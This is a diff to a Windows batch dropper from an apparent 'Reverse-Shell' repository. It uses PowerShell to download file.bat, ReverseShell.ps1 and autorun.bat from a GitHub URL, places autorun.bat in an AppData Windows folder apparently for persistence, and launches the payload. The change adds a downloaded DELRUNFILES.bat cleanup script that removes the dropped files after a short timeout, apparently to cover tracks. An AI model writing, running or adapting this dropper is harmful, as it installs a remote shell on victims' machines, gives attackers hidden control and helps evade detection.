@@ -6,6 +6,7 @@ powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/OscarZo
 powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/OscarZoomer/Reverse-Shell/main/file.bat -Outfile file.bat"
 powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/OscarZoomer/Reverse-Shell/main/ReverseShell.ps1 -Outfile ReverseShell.ps1"
 powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/OscarZoomer/Reverse-Shell/main/autorun.bat -Outfile autorun.bat"
+powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/OscarZoomer/Reverse-Shell/main/DELRUNFILES.bat -Outfile DELRUNFILES.bat"
 cd %appdata%
 cd Microsoft
 cd Windows
@@ -16,5 +17,5 @@ xcopy /s/y c:\kaas\autorun.bat
 cd C:\
 cd kaas
 launch.bat
-del /f autorun.bat
-del /f run2.bat
+timeout /t 2 /nobreak
+DELRUNFILES.bat
